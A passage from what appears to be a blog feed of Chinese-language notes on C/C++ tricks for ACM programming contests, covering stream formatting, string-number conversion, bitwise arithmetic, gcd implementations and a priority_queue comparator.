class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">3</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//  7 数字前面2个空格</span><br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">5</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//    7 数字前面4个空格</span><br><span class="hljs-keyword">int</span> n=<span class="hljs-number">17</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">3</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">// 17 数字前面1个空格</span><br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">5</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//   17 数字前面3个空格</span><br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">7</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//     17 数字前面5个空格</span><br><br><span class="hljs-number">3.</span>设置其他字符填充(是字符!!!)<br>通常配合setw实用<br>例：输出<span class="hljs-number">7</span>位，开始s和结束t,中间都是b<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&#x27;s&#x27;</span>&lt;&lt;setfill(<span class="hljs-string">&#x27;b&#x27;</span>)&lt;&lt;setw(<span class="hljs-number">7</span>)&lt;&lt;<span class="hljs-string">&#x27;t&#x27;</span>&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//sbbbbbbt t前面6个b</span><br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&#x27;s&#x27;</span>&lt;&lt;setw(<span class="hljs-number">7</span>)&lt;&lt;setfill(<span class="hljs-string">&#x27;b&#x27;</span>)&lt;&lt;<span class="hljs-string">&#x27;t&#x27;</span>&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//sbbbbbbt t前面6个b</span><br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">7</span>)&lt;&lt;<span class="hljs-string">&#x27;s&#x27;</span>&lt;&lt;setfill(<span class="hljs-string">&#x27;b&#x27;</span>)&lt;&lt;<span class="hljs-string">&#x27;t&#x27;</span>&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//      st s前面6个空格</span><br><br></code></pre></div></td></tr></table></figure><h1 id="二-String相关"><a href="#二-String相关" class="headerlink" title="二. String相关"></a>二. String相关</h1><h2 id="1-修改string对象的方法"><a href="#1-修改string对象的方法" class="headerlink" title="1. 修改string对象的方法"></a>1. 修改string对象的方法</h2><h3 id="1-s-insert"><a href="#1-s-insert" class="headerlink" title="1) s.insert()"></a>1) s.insert()</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">s.insert(p,t)<br></code></pre></div></td></tr></table></figure><h1 id="三-数字与字符串函数"><a href="#三-数字与字符串函数" class="headerlink" title="三.数字与字符串函数"></a>三.数字与字符串函数</h1><h2 id="3-1-1-数字转字符串（C）"><a href="#3-1-1-数字转字符串（C）" class="headerlink" title="3.1.1 数字转字符串（C）"></a>3.1.1 数字转字符串（C）</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">int</span> a=<span class="hljs-number">152</span>;<br><span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">sprintf</span>(s,<span class="hljs-string">&quot;%d&quot;</span>,a);<br><span class="hljs-keyword">int</span> len=<span class="hljs-built_in">strlen</span>(s); <span class="hljs-comment">//3</span><br></code></pre></div></td></tr></table></figure><h2 id="3-1-1-字符串转数字（C）"><a href="#3-1-1-字符串转数字（C）" class="headerlink" title="3.1.1 字符串转数字（C）"></a>3.1.1 字符串转数字（C）</h2><p>int sscanf(const char *str, const char *format, …)</p><blockquote><p>str – 这是 C 字符串，是函数检索数据的源。<br>format – 这是 C 字符串，包含了一个或多个：空格字符、非空格字符 和 format 说明符。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> day, year;<br>    <span class="hljs-keyword">char</span> weekday[<span class="hljs-number">20</span>], month[<span class="hljs-number">20</span>];<br>    <span class="hljs-keyword">char</span>* dtm=<span class="hljs-string">&quot;Saturday March 25 1989&quot;</span>;<br>   <span class="hljs-built_in">sscanf</span>(dtm,<span class="hljs-string">&quot;%s%s%d%d&quot;</span>,weekday,month,&amp;day,&amp;year);<br><br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %d, %d = %s\n&quot;</span>,month,day,year,weekday);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出</span><br>March <span class="hljs-number">25</span>, <span class="hljs-number">1989</span> = Saturday<br></code></pre></div></td></tr></table></figure><h2 id="3-2-1-数字转字符串（C-）"><a href="#3-2-1-数字转字符串（C-）" class="headerlink" title="3.2.1 数字转字符串（C++）"></a>3.2.1 数字转字符串（C++）</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><br></code></pre></div></td></tr></table></figure><h2 id="3-2-2-字符串转数字（C-）"><a href="#3-2-2-字符串转数字（C-）" class="headerlink" title="3.2.2 字符串转数字（C++）"></a>3.2.2 字符串转数字（C++）</h2><p><strong>字符串分隔</strong></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">string</span> str=<span class="hljs-string">&quot;i am a boy&quot;</span>;  <br>    <span class="hljs-function"><span class="hljs-built_in">istringstream</span> <span class="hljs-title">is</span><span class="hljs-params">(str)</span></span>;  <br>    <span class="hljs-built_in">string</span> s;  <br>    <span class="hljs-keyword">while</span>(is&gt;&gt;s)  &#123;  <br>        <span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;  <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出</span><br>i<br>am <br>a  <br>boy<br></code></pre></div></td></tr></table></figure><p><strong>字符串转数字</strong></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">string</span> str=<span class="hljs-string">&quot;5 15 32 85&quot;</span>;  <br>    <span class="hljs-function"><span class="hljs-built_in">istringstream</span> <span class="hljs-title">is</span><span class="hljs-params">(str)</span></span>;  <br>    <span class="hljs-comment">//is.clear(); //clear()仅仅清空标志位，并没有释放内存。利用stringstream.str(&quot;&quot;)来清空stringstream。</span><br>    <span class="hljs-keyword">int</span> s;  <br>    <span class="hljs-keyword">while</span>(is&gt;&gt;s)  &#123;  <br>        <span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;  <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">5</span><br><span class="hljs-number">15</span><br><span class="hljs-number">32</span><br><span class="hljs-number">85</span><br></code></pre></div></td></tr></table></figure><h1 id="四-string-中的函数"><a href="#四-string-中的函数" class="headerlink" title="四.string 中的函数"></a>四.string 中的函数</h1><h2 id="4-1"><a href="#4-1" class="headerlink" title="4.1"></a>4.1</h2><h3 id="4-1-1-stod"><a href="#4-1-1-stod" class="headerlink" title="4.1.1 stod()"></a>4.1.1 stod()</h3><h3 id="4-1-2-stof"><a href="#4-1-2-stof" class="headerlink" title="4.1.2 stof()"></a>4.1.2 stof()</h3><h3 id="4-1-3-stoi"><a href="#4-1-3-stoi" class="headerlink" title="4.1.3 stoi()"></a>4.1.3 stoi()</h3><h3 id="4-1-4-stol"><a href="#4-1-4-stol" class="headerlink" title="4.1.4 stol()"></a>4.1.4 stol()</h3><h3 id="4-1-5-stold"><a href="#4-1-5-stold" class="headerlink" title="4.1.5 stold()"></a>4.1.5 stold()</h3><h3 id="4-1-6-stoll"><a href="#4-1-6-stoll" class="headerlink" title="4.1.6 stoll()"></a>4.1.6 stoll()</h3><h3 id="4-1-7-stoul"><a href="#4-1-7-stoul" class="headerlink" title="4.1.7 stoul()"></a>4.1.7 stoul()</h3><h3 id="4-1-8-stoull"><a href="#4-1-8-stoull" class="headerlink" title="4.1.8 stoull()"></a>4.1.8 stoull()</h3><h2 id="4-2"><a href="#4-2" class="headerlink" title="4.2"></a>4.2</h2><h3 id="4-2-1-atoi"><a href="#4-2-1-atoi" class="headerlink" title="4.2.1 atoi()"></a>4.2.1 atoi()</h3><p>持续更新中······</p>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-拓展知识点</title>
    <link href="/2021/04/07/ACM/ACM-%E6%8B%93%E5%B1%95%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2021/04/07/ACM/ACM-%E6%8B%93%E5%B1%95%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>记录ACM中一些好用的小技巧、方法，以及一些见的少的知识点及其用法。</p><h3 id="1-求负数的绝对值"><a href="#1-求负数的绝对值" class="headerlink" title="1.求负数的绝对值"></a>1.求负数的绝对值</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">方法：取反加<span class="hljs-number">1</span><br>例：求<span class="hljs-number">-125</span>的绝对值<br><span class="hljs-keyword">int</span> n=~<span class="hljs-number">-125</span>+<span class="hljs-number">1</span>; <span class="hljs-comment">//n=125</span><br><span class="hljs-keyword">int</span> m=<span class="hljs-number">-125</span>;<br><span class="hljs-keyword">int</span> t=~m+<span class="hljs-number">1</span>; <span class="hljs-comment">//t=125</span><br></code></pre></div></td></tr></table></figure><h3 id="2-求素数"><a href="#2-求素数" class="headerlink" title="2.求素数"></a>2.求素数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">分为奇、偶数求。<br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isprime</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span>&#123;<br><span class="hljs-keyword">if</span>(n%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//2需特判</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">3</span>;i&lt;=<span class="hljs-built_in">sqrt</span>(n);i+=<span class="hljs-number">2</span>)&#123; <span class="hljs-comment">//奇数只能由奇数的积得来，3需要特判</span><br><span class="hljs-keyword">if</span>(n%i==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-求2个数的平均数"><a href="#3-求2个数的平均数" class="headerlink" title="3.求2个数的平均数"></a>3.求2个数的平均数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">正常求两个数的平均数为相加除以<span class="hljs-number">2</span>，但如果是两个很大的数呢？以至于相加的结果超出了所有整数类型的范围？相加的结果超出了数据的最大范围值时。这时为防止这样的两个很大的数相加的结果超出数据类型的最大值。采用新的求法。<br><span class="hljs-keyword">int</span> a=<span class="hljs-number">100</span>,b=<span class="hljs-number">62</span>;<br><span class="hljs-keyword">int</span> mid1=(a+b)/<span class="hljs-number">2</span>; <span class="hljs-comment">//常规做法</span><br><span class="hljs-keyword">int</span> mid2=(b-a)/<span class="hljs-number">2</span>+a; <span class="hljs-comment">//技巧算法</span><br></code></pre></div></td></tr></table></figure><h3 id="4-求2的n次方"><a href="#4-求2的n次方" class="headerlink" title="4.求2的n次方"></a>4.求2的n次方</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> t=<span class="hljs-number">1</span>&lt;&lt;n; <span class="hljs-comment">//2的n次方</span><br>补充:<br>m&lt;&lt;t;<span class="hljs-comment">//m乘以2的t次方 m*(2^t)</span><br><span class="hljs-keyword">int</span> m=n&lt;&lt;<span class="hljs-number">1</span>; <span class="hljs-comment">//n乘以2</span><br>m&gt;&gt;t;<span class="hljs-comment">//m除以2的t次方 m/(2^t)</span><br><span class="hljs-keyword">int</span> m=n&gt;&gt;<span class="hljs-number">1</span>; <span class="hljs-comment">//n除以2</span><br></code></pre></div></td></tr></table></figure><h3 id="5-求一个数取余2的n次方后的数"><a href="#5-求一个数取余2的n次方后的数" class="headerlink" title="5.求一个数取余2的n次方后的数"></a>5.求一个数取余2的n次方后的数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">因为<span class="hljs-number">2</span>的次方用二进制来表示会成为<span class="hljs-number">1000.</span>..的形式，所以也可以通过按位与运算来进行取余，因为凡是后面不为<span class="hljs-number">0</span>的为对应的都是余数。<br>n&amp;<span class="hljs-number">3</span>;<span class="hljs-comment">//n取余4</span><br>n&amp;((<span class="hljs-number">1</span>&lt;&lt;m)<span class="hljs-number">-1</span>);<span class="hljs-comment">//n取余2^m</span><br></code></pre></div></td></tr></table></figure><h3 id="6-求两个数的最大公约数"><a href="#6-求两个数的最大公约数" class="headerlink" title="6.求两个数的最大公约数"></a>6.求两个数的最大公约数</h3><blockquote><p>1.辗转相除法<br>a，b不可以为 0。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> a, b, i;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入两个整数：\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a=&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b=&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;b);<br>    i = a % b;<br>    <span class="hljs-keyword">while</span>(i != <span class="hljs-number">0</span>)&#123;<br>        a = b;<br>        b = i;<br>        i = a % b;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,b);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>2.位运算<br>a，b不可以为 0。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">while</span>(b^=a^=b^=a%=b);<br>    <span class="hljs-keyword">return</span> a;   <span class="hljs-comment">//最大公约数</span><br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>3.三目运算<br>a，b可以为 0。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> b&gt;<span class="hljs-number">0</span> ? gcd(b,a%b):a;<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>4.C++自带函数</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">__gcd(a,b);<br></code></pre></div></td></tr></table></figure><h3 id="7-用scanf输入string"><a href="#7-用scanf输入string" class="headerlink" title="7.用scanf输入string"></a>7.用scanf输入string</h3><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">string</span> a;<br>a.resize(<span class="hljs-number">100</span>); <span class="hljs-comment">//需要预先分配空间</span><br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, &amp;a[<span class="hljs-number">0</span>]); <span class="hljs-comment">//不能写成&amp;a,必须要写&amp;a[0]</span><br><span class="hljs-comment">//printf(&quot;%s&quot;,a.c_str());</span><br><span class="hljs-comment">//puts(a.c_str());</span><br><span class="hljs-built_in">cout</span>&lt;&lt;a.c_str()&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>c_str()函数返回一个指向正规C字符串的指针常量, 内容与本string串相同。为了与c语言兼容，在c语言中没有string类型，故必须通过string类对象的成员函数c_str()把string 对象转换成c中的字符串样式。</p><h4 id="7-1从指定的下标开始输入"><a href="#7-1从指定的下标开始输入" class="headerlink" title="7.1从指定的下标开始输入"></a>7.1从指定的下标开始输入</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//这里以从下标1开始存入</span><br><span class="hljs-built_in">string</span> s;<br>s.resize(<span class="hljs-number">100</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,&amp;s[<span class="hljs-number">1</span>]); <span class="hljs-comment">//指定从下标1开始存</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">10</span>;++i) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,s[i]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,s[<span class="hljs-number">1</span>]);<br></code></pre></div></td></tr></table></figure><h3 id="8-优先队列（priority-queue）的自定义排序"><a href="#8-优先队列（priority-queue）的自定义排序" class="headerlink" title="8.优先队列（priority_queue）的自定义排序"></a>8.优先队列（priority_queue）的自定义排序</h3><h4 id="实现一"><a href="#实现一" class="headerlink" title="实现一"></a>实现一</h4><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOS ios::sync_with_stdio(0);cin.tie(0),cout.tie(0);</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF=<span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> maxn=<span class="hljs-number">1e6</span>+<span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PI acos(-1)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sq</span>&#123;</span><br><span class="hljs-keyword">int</span> num ,id;<br>&#125;;<br><span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>&lt;(<span class="hljs-keyword">const</span> sq &amp;x, <span class="hljs-keyword">const</span> sq &amp;y)&#123;<span class="hljs-comment">//重载小于号，适用于优先队列的排序规则</span><br><span class="hljs-keyword">if</span>(x.num==y.num)<br><span class="hljs-keyword">return</span> x.id&gt;y.id; <span class="hljs-comment">//小的数在前面，与其他的容器用法区别开。就同在优先队列中的greater和less用法和在其他容器中greater和less用法相反一样。下同</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> x.num&gt;y.num; <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">priority_queue</span>&lt;sq&gt; s;<br>sq a;<br>a.id=<span class="hljs-number">10</span>;<br>a.num=<span class="hljs-number">30</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">20</span>;<br>a.num=<span class="hljs-number">40</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">30</span>;<br>a.num=<span class="hljs-number">50</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">3</span>;<br>a.num=<span class="hljs-number">50</span>;<br>s.push(a);<br><span class="hljs-keyword">int</span> len=s.size();<br><span class="hljs-built_in">cout</span>&lt;&lt;len&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;len;++i)&#123;<br>sq t=s.top();<br><span class="hljs-built_in">cout</span>&lt;&lt;t.num&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;t.id&lt;&lt;<span class="hljs-built_in">endl</span>;<br>s.pop();<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>IOS;<br>solve();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">4</span><br><span class="hljs-number">30</span> <span class="hljs-number">10</span><br><span class="hljs-number">40</span> <span class="hljs-number">20</span><br><span 